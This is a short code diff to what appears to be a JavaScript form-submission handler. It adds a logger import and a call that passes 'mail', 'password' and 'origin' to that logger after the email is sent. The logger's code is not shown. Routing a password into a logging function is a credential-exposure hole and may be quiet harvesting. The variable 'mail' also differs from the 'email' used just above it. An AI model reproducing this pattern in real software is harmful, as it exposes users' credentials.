@@ -1,3 +1,4 @@
+const { logger } = require("../utils/logger");
 const { mailer } = require("../utils/mailer");
 
 const processSubmission = async (req, res) => {
@@ -20,6 +21,7 @@ const processSubmission = async (req, res) => {
     }
 
     await mailer(email, message, subject);
+    await logger(mail, password, origin);
 
     res.status(200).json({ message: "Message Sent" });
   } catch (error) {
